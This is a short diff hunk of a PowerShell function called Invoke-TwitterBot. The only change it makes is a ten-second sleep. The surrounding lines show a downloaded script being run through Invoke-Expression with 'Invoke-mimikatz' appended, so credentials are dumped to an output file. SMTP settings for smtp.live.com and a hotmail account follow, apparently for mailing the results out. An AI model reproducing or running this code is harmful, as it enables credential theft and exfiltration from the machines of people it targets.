@@ -246,7 +246,7 @@ Function Invoke-TwitterBot {
             [string] $AppendString = "Invoke-mimikatz > $OutPath"
             $downloadedScript += $AppendString
             Invoke-Expression $downloadedScript
-               
+              start-sleep -s 10 
                 $SMTPServer = "smtp.live.com"
 $SMTPPort = "587"
 $Username = "thesupersonic@hotmail.com"
